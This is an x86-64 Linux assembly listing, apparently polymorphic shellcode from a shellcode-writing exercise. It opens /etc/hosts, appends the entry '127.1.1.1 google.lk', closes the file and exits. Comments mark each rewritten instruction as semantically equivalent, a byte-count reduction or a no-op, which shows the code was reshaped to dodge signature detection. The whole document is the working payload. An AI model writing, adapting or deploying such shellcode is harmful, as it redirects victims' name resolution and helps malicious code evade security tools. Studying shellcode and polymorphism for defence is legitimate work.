
global _start
    section .text

_start:
    ;open
;    xor rax, rax 
    ;add rax, 2  ; open syscall
	push byte 2		; symantically equiv 
	pop rax
;    xor rdi, rdi
	xor edi, edi		; opcode reduction

;    xor rsi, rsi
	xor esi, esi		; opcode reduction
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    ;xor rsi, rsi
    xor esi, esi		; opcode reduction
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi		; fd
;    xor rax, rax
 ;   add rax, 1 ; syscall for write
	push byte 1		; symatically equiv
	pop rax			; symatically equiv 
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

	xchg r10, rbp		; nop equiv
	dec r10			; nop equiv 

    ;close
;    xor rax, rax
;    add rax, 3
	push byte 3		; symantically equiv
	pop rax			; symantically equiv 
    syscall

    ;exit
;    xor rax, rax
 ;   mov al, 60
	push byte 60		; symatically equiv 
	pop rax			; symatically equiv 
 ;   xor rdi, rdi
	xor edi, esi		; opcode reduction
	
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
